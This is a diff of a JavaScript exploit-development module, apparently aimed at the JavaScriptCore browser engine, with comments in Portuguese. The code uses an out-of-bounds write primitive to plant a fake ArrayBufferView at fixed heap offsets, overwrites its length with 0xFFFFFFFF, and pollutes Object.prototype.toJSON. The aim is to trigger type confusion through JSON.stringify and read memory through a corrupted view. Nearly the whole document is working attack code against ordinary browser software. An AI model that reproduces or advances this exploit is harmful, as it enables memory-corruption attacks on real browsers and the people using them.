@@ -1,5 +1,5 @@
 // js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
+import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
@@ -9,113 +9,113 @@ import {
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v22_IsolateMemCrash";
+const FNAME_MAIN = "ExploitLogic_v23_RevisitOriginalCrash";
 
 // --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
-const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58;
-const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; 
-const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       
+const FAKE_VIEW_BASE_OFFSET_IN_OOB    = 0x58;
+const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; // Placeholder
+const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       // Placeholder (Uint32ArrayType)
 const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
 const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
 const FAKE_VIEW_CELLINFO_STATE        = 0x01;
-const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; 
-const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero; 
-// MODIFICAÇÃO AQUI: Usar um m_length pequeno para teste
-const FAKE_VIEW_MLENGTH_VALUE         = 0x100; // 256 elementos (1024 bytes se Uint32Array)
-// const FAKE_VIEW_MLENGTH_VALUE_ORIGINAL = 0xFFFFFFFF; // Guardar o original se precisarmos
-const FAKE_VIEW_MMODE_VALUE           = 0x00000000;     
+const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; // Placeholder problemático
+const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero;
+const FAKE_VIEW_MLENGTH_INITIAL_PLANT = 0x100;      // Plantar inicialmente um tamanho "seguro"
+const FAKE_VIEW_MMODE_VALUE           = 0x00000000;
 
+// --- Constantes para a Corrupção Crítica ---
+const CRITICAL_OOB_WRITE_OFFSET = 0x70; // Offset no oob_array_buffer_real
+const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; // Valor que causava instabilidade (sobrescreverá m_length da fake view)
+
+// --- Marcadores para Leitura via Potencial SuperView ---
 const OOB_BUFFER_MARKER_OFFSET = 0x0; 
-const OOB_BUFFER_MARKER_VALUE  = 0x41424344;
-const FAKE_VIEW_SID_READ_OFFSET = FAKE_VIEW_BASE_OFFSET_IN_OOB; 
+const OOB_BUFFER_MARKER_VALUE  = 0x41424344; // 'ABCD'
 const OTHER_SID_READ_OFFSET    = 0x400; 
 const OTHER_SID_READ_VALUE     = 0xFEEDFACE;
 
-let getter_activation_details = null;
+let getter_probe_details = null;
 
 // ============================================================
-// FUNÇÃO toJSON Poluída (mesma da v21)
+// FUNÇÃO toJSON Poluída para Sondar 'this'
 // ============================================================
-function toJSON_FocusActivationAttempt_v22() { // Renomeado levemente para clareza de versão
-    const FNAME_toJSON = "toJSON_FocusActivation_v22";
-    logS3(`[${FNAME_toJSON}] Getter ACIONADO!`, "vuln", FNAME_toJSON);
-    getter_activation_details = {
+function toJSON_ProbeArrayBufferState_v23() {
+    const FNAME_toJSON = "toJSON_ProbeArrayBufferState_v23";
+    // Log mínimo aqui para evitar interferir com o heisenbug,
+    // mas capturar informações essenciais se 'this' for corrompido.
+    
+    getter_probe_details = {
+        toJSON_executed: FNAME_toJSON,
         this_type: "N/A",
-        this_length: "N/A",
-        read_oob_marker: "N/A",
-        read_fake_view_sid: "N/A",
-        read_other_sid: "N/A",
+        this_byteLength: "N/A",
+        read_at_0: "N/A", // Leitura de this[0]
+        read_at_fake_view_sid: "N/A", // Leitura de this[FAKE_VIEW_BASE_OFFSET_IN_OOB/4]
+        read_at_other_sid: "N/A", // Leitura de this[OTHER_SID_READ_OFFSET/4]
         error: null
     };
 
     try {
-        getter_activation_details.this_type = Object.prototype.toString.call(this);
-        logS3(`  [${FNAME_toJSON}] this type: ${getter_activation_details.this_type}`, "info", FNAME_toJSON);
-
-        getter_activation_details.this_length = this.length;
-        logS3(`  [${FNAME_toJSON}] this.length: ${toHex(getter_activation_details.this_length)} (Decimal: ${getter_activation_details.this_length})`, "leak", FNAME_toJSON);
-
-        // Verificamos contra o FAKE_VIEW_MLENGTH_VALUE que agora é pequeno (0x100)
-        if (getter_activation_details.this_length === FAKE_VIEW_MLENGTH_VALUE || getter_activation_details.this_length === 0xFFFFFFFF) {
-            logS3(`    !!!! POTENCIAL VIEW COM LENGTH MODIFICADO DETECTADA !!!! this.length: ${toHex(this.length)}`, "vuln", FNAME_toJSON);
-            document.title = "MODIFIED_LEN_VIEW ACTIVE?!";
-
-            try {
-                const val_marker = this[OOB_BUFFER_MARKER_OFFSET / 4]; 
-                getter_activation_details.read_oob_marker = toHex(val_marker);
-                logS3(`    [View?] this[${OOB_BUFFER_MARKER_OFFSET / 4}] (lendo OOB_BUFFER_MARKER de ${toHex(OOB_BUFFER_MARKER_OFFSET)}): ${toHex(val_marker)} (Esperado: ${toHex(OOB_BUFFER_MARKER_VALUE)})`, "leak", FNAME_toJSON);
-            } catch (e_read_marker) { /* ... */ }
-
-            try {
-                const val_fvsid = this[FAKE_VIEW_SID_READ_OFFSET / 4];
-                getter_activation_details.read_fake_view_sid = toHex(val_fvsid);
-                logS3(`    [View?] this[${FAKE_VIEW_SID_READ_OFFSET / 4}] (lendo FAKE_VIEW_SID de ${toHex(FAKE_VIEW_SID_READ_OFFSET)}): ${toHex(val_fvsid)} (Esperado: ${toHex(FAKE_VIEW_STRUCTURE_ID)})`, "leak", FNAME_toJSON);
-            } catch (e_read_fvsid) { /* ... */ }
-            
-            try {
-                const val_osid = this[OTHER_SID_READ_OFFSET / 4];
-                getter_activation_details.read_other_sid = toHex(val_osid);
-                logS3(`    [View?] this[${OTHER_SID_READ_OFFSET / 4}] (lendo OTHER_SID de ${toHex(OTHER_SID_READ_OFFSET)}): ${toHex(val_osid)} (Esperado: ${toHex(OTHER_SID_READ_VALUE)})`, "leak", FNAME_toJSON);
-            } catch (e_read_osid) { /* ... */ }
-
-        } else if (typeof getter_activation_details.this_length === 'number') {
-            logS3(`    INFO: this.length (${toHex(this.length)}) não é o esperado para a SuperView (0xFFFFFFFF) nem o m_length de teste (0x100).`, "info", FNAME_toJSON);
+        getter_probe_details.this_type = Object.prototype.toString.call(this);
+        
+        if (!(this instanceof ArrayBuffer)) {
+            getter_probe_details.error = "this is not an ArrayBuffer as expected by toJSON_ProbeArrayBufferState_v23.";
+            logS3(`[${FNAME_toJSON}] ${getter_probe_details.error} Type: ${getter_probe_details.this_type}`, "critical", FNAME_toJSON);
+            return getter_probe_details;
         }
-    } catch (e_main_getter) {
-        logS3(`  [${FNAME_toJSON}] ERRO GERAL NO GETTER: ${e_main_getter.name} - ${e_main_getter.message}`, "critical", FNAME_toJSON);
-        getter_activation_details.error = `${e_main_getter.name}: ${e_main_getter.message}`;
-        document.title = `GETTER CRASH: ${e_main_getter.name}`;
+
+        getter_probe_details.this_byteLength = this.byteLength;
+        // Não logar o byteLength aqui dentro para ser mais leve.
+
+        // Se o byteLength for o valor massivo (0xFFFFFFFF) que escrevemos em 0x70,
+        // isso é um sinal de que 'this' (victim_ab) pode ter sido confundido com nossa estrutura fake.
+        if (this.byteLength === CRITICAL_OOB_WRITE_VALUE || this.byteLength === FAKE_VIEW_MLENGTH_INITIAL_PLANT) {
+            logS3(`[${FNAME_toJSON}] 'this' (victim_ab) tem byteLength = ${toHex(this.byteLength)}. Tentando leituras...`, "vuln", FNAME_toJSON);
+            document.title = `toJSON: victim_ab len=${toHex(this.byteLength)}`;
+            try {
+                const temp_view = new Uint32Array(this); // Criar view sobre 'this'
+                getter_probe_details.read_at_0 = toHex(temp_view[OOB_BUFFER_MARKER_OFFSET / 4]);
+                getter_probe_details.read_at_fake_view_sid = toHex(temp_view[FAKE_VIEW_BASE_OFFSET_IN_OOB / 4]);
+                getter_probe_details.read_at_other_sid = toHex(temp_view[OTHER_SID_READ_OFFSET / 4]);
+            } catch (e_read) {
+                getter_probe_details.error = `Error reading elements from 'this': ${e_read.message}`;
+                logS3(`[${FNAME_toJSON}] Erro ao ler elementos de 'this': ${e_read.message}`, "error", FNAME_toJSON);
+            }
+        }
+    } catch (e_main) {
+        getter_probe_details.error = `General error in toJSON: ${e_main.name} - ${e_main.message}`;
+        // Não logar daqui para evitar TypeError se o logS3 for o problema
+        // logS3(`[${FNAME_toJSON}] Erro geral no getter: ${e_main.message}`, "critical", FNAME_toJSON);
     }
-    return { toJSON_getter_executed: true, collected_details: getter_activation_details };
+    return getter_probe_details;
 }
 
 // ============================================================
-// FUNÇÃO PRINCIPAL (v22_IsolateMemCrash)
+// FUNÇÃO PRINCIPAL (v23_RevisitOriginalCrash)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.isolateMemCrashTrigger`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Isolar Causa do Erro de Memória (m_length=${toHex(FAKE_VIEW_MLENGTH_VALUE)}) ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `IsolateMemCrash v22 (len=${toHex(FAKE_VIEW_MLENGTH_VALUE)})`;
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.revisitOriginalCrashConditions`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Revisitando Condições do Crash Original com Sondagem Melhorada ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `RevisitCrash v23 Test...`;
 
-    getter_activation_details = null; 
-    let trigger_obj = { p1: "trigger_data_v22", p2: { n1: 456 }}; 
+    getter_probe_details = null; // Resetar
+    const victim_ab_size = 64;
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
 
-        logS3(`PASSO 1: Plantando estrutura fake de ArrayBufferView em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)} com m_length=${toHex(FAKE_VIEW_MLENGTH_VALUE)}...`, "info", FNAME_CURRENT_TEST);
+        // PASSO 1: Plantar a estrutura FALSA de ArrayBufferView em 0x58 com m_length INICIALMENTE "seguro"
+        logS3(`PASSO 1: Plantando estrutura fake em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)} com m_length=${toHex(FAKE_VIEW_MLENGTH_INITIAL_PLANT)}...`, "info", FNAME_CURRENT_TEST);
         const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
         const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
         const bufferPtrOff   = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET;
         const mVectorOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
-        const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
+        const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // Este é 0x70
         const mModeOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;
 
         oob_write_absolute(sidOffset, FAKE_VIEW_STRUCTURE_ID, 4);
@@ -125,60 +125,74 @@ export async function sprayAndInvestigateObjectExposure() {
         oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1);
         oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8); 
         oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
-        oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_VALUE, 4); // Usando o m_length modificado
+        oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_INITIAL_PLANT, 4); // m_length = 0x100
         oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
-        logS3(`  Estrutura fake plantada. SID: ${toHex(FAKE_VIEW_STRUCTURE_ID)}, m_vec: ${FAKE_VIEW_MVECTOR_VALUE.toString(true)}, m_len: ${toHex(FAKE_VIEW_MLENGTH_VALUE)}.`, "good", FNAME_CURRENT_TEST);
+        logS3(`  Estrutura fake plantada em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}.`, "good", FNAME_CURRENT_TEST);
 
+        // Plantar marcadores no oob_array_buffer_real
         oob_write_absolute(OOB_BUFFER_MARKER_OFFSET, OOB_BUFFER_MARKER_VALUE, 4);
-        logS3(`  Plantado OOB_BUFFER_MARKER_VALUE (${toHex(OOB_BUFFER_MARKER_VALUE)}) em ${toHex(OOB_BUFFER_MARKER_OFFSET)}`, "info", FNAME_CURRENT_TEST);
+        logS3(`  Plantado Marcador OOB (${toHex(OOB_BUFFER_MARKER_VALUE)}) em ${toHex(OOB_BUFFER_MARKER_OFFSET)}`, "info", FNAME_CURRENT_TEST);
         oob_write_absolute(OTHER_SID_READ_OFFSET, OTHER_SID_READ_VALUE, 4);
-        logS3(`  Plantado OTHER_SID_READ_VALUE (${toHex(OTHER_SID_READ_VALUE)}) em ${toHex(OTHER_SID_READ_OFFSET)}`, "info", FNAME_CURRENT_TEST);
+        logS3(`  Plantado Outro Marcador (${toHex(OTHER_SID_READ_VALUE)}) em ${toHex(OTHER_SID_READ_OFFSET)}`, "info", FNAME_CURRENT_TEST);
         
-        logS3("Pausa de 100ms após plantações...", "info", FNAME_CURRENT_TEST);
-        await PAUSE_S3(100);
-        logS3("Pausa concluída. Prosseguindo para PASSO 2 (JSON.stringify).", "info", FNAME_CURRENT_TEST);
+        await PAUSE_S3(50);
 
+        // PASSO 2: Escrita OOB CRÍTICA em 0x70 (sobrescrevendo o m_length da estrutura fake para 0xFFFFFFFF)
+        logS3(`PASSO 2: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(CRITICAL_OOB_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
+        oob_write_absolute(CRITICAL_OOB_WRITE_OFFSET, CRITICAL_OOB_WRITE_VALUE, 4);
+        logS3(`  Escrita crítica em ${toHex(CRITICAL_OOB_WRITE_OFFSET)} realizada. m_length da estrutura fake em 0x58 agora deve ser 0xFFFFFFFF.`, "info", FNAME_CURRENT_TEST);
+        
+        await PAUSE_S3(50);
 
-        logS3(`PASSO 2: Tentando ativação especulativa via JSON.stringify e toJSON poluído...`, "test", FNAME_CURRENT_TEST);
+        // PASSO 3: Criar victim_ab e tentar JSON.stringify com toJSON poluído
+        let victim_ab = new ArrayBuffer(victim_ab_size);
+        logS3(`PASSO 3: victim_ab (${victim_ab_size} bytes) criado. Tentando JSON.stringify(victim_ab) com toJSON_ProbeArrayBufferState_v23...`, "test", FNAME_CURRENT_TEST);
+        
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
         let pollutionApplied = false;
+        let stringifyResult = null;
+        let errorCaptured = null;
+        let potentiallyCrashed = true;
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_FocusActivationAttempt_v22, 
+                value: toJSON_ProbeArrayBufferState_v23,
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_FocusActivationAttempt_v22.name}.`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} poluído.`, "info", FNAME_CURRENT_TEST);
 
-            logS3(`  Chamando JSON.stringify(trigger_obj)... Trigger: ${JSON.stringify(trigger_obj)}`, "info", FNAME_CURRENT_TEST);
-            await PAUSE_S3(50); 
-            let stringifyResult = JSON.stringify(trigger_obj); 
+            logS3(`  Chamando JSON.stringify(victim_ab)...`, "info", FNAME_CURRENT_TEST);
+            stringifyResult = JSON.stringify(victim_ab); 
+            potentiallyCrashed = false;
             
-            logS3(`  JSON.stringify completou. Resultado (parcial): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_CURRENT_TEST);
-            if (getter_activation_details) {
-                logS3(`  Detalhes coletados pelo getter toJSON: ${JSON.stringify(getter_activation_details)}`, "leak", FNAME_CURRENT_TEST);
-                 if (getter_activation_details.this_length === FAKE_VIEW_MLENGTH_VALUE && getter_activation_details.read_oob_marker === toHex(OOB_BUFFER_MARKER_VALUE) ) { // Ou 0xFFFFFFFF se o length esperado for esse
-                    logS3("    !!!! SUCESSO ESPECULATIVO !!!! 'this' no toJSON parece ser a VIEW FUNCIONAL com m_length modificado!", "vuln", FNAME_CURRENT_TEST);
-                    document.title = "MODIFIED_VIEW ACTIVATED & READ OK!";
-                } else if (getter_activation_details.error) {
-                     logS3(`    PROBLEMA: Erro no getter: ${getter_activation_details.error}`, "error", FNAME_CURRENT_TEST);
-                } else {
-                    logS3("    INFO: Getter toJSON executado, mas 'this' não se comportou como a View esperada ou leituras falharam.", "info", FNAME_CURRENT_TEST);
+            logS3(`  JSON.stringify completou. Resultado (getter_probe_details): ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+
+            if (stringifyResult) { // stringifyResult é o objeto retornado por toJSON_ProbeArrayBufferState_v23
+                if (stringifyResult.error) {
+                    logS3(`    ERRO DENTRO da toJSON: ${stringifyResult.error}`, "error", FNAME_CURRENT_TEST);
                 }
-            } else {
-                 logS3("    AVISO: getter_activation_details é nulo.", "critical", FNAME_CURRENT_TEST);
+                if (stringifyResult.this_byteLength === CRITICAL_OOB_WRITE_VALUE) {
+                    logS3("    !!!! SUCESSO ESPECULATIVO !!!! 'this' (victim_ab) no toJSON tem byteLength IGUAL ao CRITICAL_OOB_WRITE_VALUE!", "vuln", FNAME_CURRENT_TEST);
+                    logS3(`      Tentativa de leitura de this[0] (OOB_BUFFER_MARKER): ${stringifyResult.read_at_0}`, "leak", FNAME_CURRENT_TEST);
+                    logS3(`      Tentativa de leitura de this[0x58/4] (FAKE_VIEW_SID): ${stringifyResult.read_at_fake_view_sid}`, "leak", FNAME_CURRENT_TEST);
+                    logS3(`      Tentativa de leitura de this[0x400/4] (OTHER_SID): ${stringifyResult.read_at_other_sid}`, "leak", FNAME_CURRENT_TEST);
+                    document.title = "POTENTIAL TYPE CONFUSION! victim_ab -> SuperView?";
+                } else if (typeof stringifyResult.this_byteLength === 'number') {
+                    logS3(`    INFO: victim_ab.byteLength (em toJSON) = ${stringifyResult.this_byteLength} (esperado ${victim_ab_size} ou ${toHex(CRITICAL_OOB_WRITE_VALUE)})`, "info", FNAME_CURRENT_TEST);
+                }
             }
 
         } catch (e_stringify) {
-            logS3(`  ERRO CRÍTICO durante JSON.stringify(trigger_obj): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
+            errorCaptured = e_stringify;
+            potentiallyCrashed = false;
+            logS3(`  ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
             document.title = `JSON_STRINGIFY CRASH: ${e_stringify.name}`;
         } finally {
             if (pollutionApplied) {
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                 else delete Object.prototype[ppKey];
-                logS3(`  Object.prototype.${ppKey} restaurado.`, "info", FNAME_CURRENT_TEST);
             }
         }
 
@@ -189,7 +203,10 @@ export async function sprayAndInvestigateObjectExposure() {
     } finally {
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
-        if (!document.title.includes("ACTIVATED") && !document.title.includes("HIT") && !document.title.includes("FALHOU") && !document.title.includes("CRASH") && !document.title.includes("ERR")) {
+        if (potentiallyCrashed && !errorCaptured) { // Se não houve erro capturado mas não chegou ao fim esperado
+             document.title = `${FNAME_MAIN} Congelou?`;
+             logS3("O TESTE PODE TER CONGELADO/CRASHADO.", "error", FNAME_CURRENT_TEST);
+        } else if (!document.title.includes("SUCCESS") && !document.title.includes("POTENTIAL") && !document.title.includes("FALHOU") && !document.title.includes("CRASH") && !document.title.includes("ERR")) {
             document.title = `${FNAME_MAIN} Done`;
         }
     }
